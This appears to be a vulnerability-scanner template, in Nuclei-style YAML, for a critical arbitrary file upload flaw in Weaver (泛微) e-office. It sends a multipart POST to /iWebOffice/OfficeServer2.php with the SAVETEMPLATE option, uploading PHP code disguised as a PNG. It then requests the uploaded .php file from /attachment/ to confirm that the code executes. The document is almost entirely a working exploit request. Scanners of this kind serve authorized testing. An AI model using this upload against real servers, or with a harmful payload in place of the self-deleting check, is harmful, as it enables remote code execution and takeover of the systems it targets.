id: poc-yaml-weaver-e-office-savetemplate-anyfile-upload
info:
  name: 泛微OA e-office SAVETEMPLATE 任意文件上传漏洞
  author: ProjectDiscoveryAI
  severity: critical
  tags: file-upload

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - id: upload-file
    method: POST
    path:
      - "/iWebOffice/OfficeServer2.php"
    headers:
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
    body: |
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="TEMPLATE"

      {{t1}}.php
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="OPTION"

      SAVETEMPLATE
      ------WebKitFormBoundarySIELKZKzD7vQmdsO
      Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"

      <?=md5({{t1}});unlink(__FILE__);
      ------WebKitFormBoundarySIELKZKzD7vQmdsO--

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "VERSION="
          - "mFullPath"

  - id: confirm-file-execution
    method: GET
    path:
      - "/attachment/{{t1}}.php"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{{t2}}"
